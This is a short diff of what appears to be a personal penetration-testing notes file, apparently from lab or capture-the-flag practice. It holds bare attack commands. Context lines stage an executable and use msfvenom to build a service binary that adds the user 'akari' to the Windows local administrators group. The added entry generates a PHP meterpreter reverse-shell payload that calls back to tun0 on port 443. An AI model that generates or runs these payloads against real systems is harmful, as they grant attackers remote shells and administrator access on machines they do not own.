@@ -31,3 +31,9 @@ SendString("\Users\Public\staged.exe",ip)
 msfvenom -p windows/exec CMD='net localgroup administrators akari /add' -f exe-service -o common.exe
 ```
 
+### 2024-05-12-Sun
+
+```
+msfvenom -p php/meterpreter/reverse_tcp -f raw lhost=tun0 lport=443 > pwned.php
+```
+
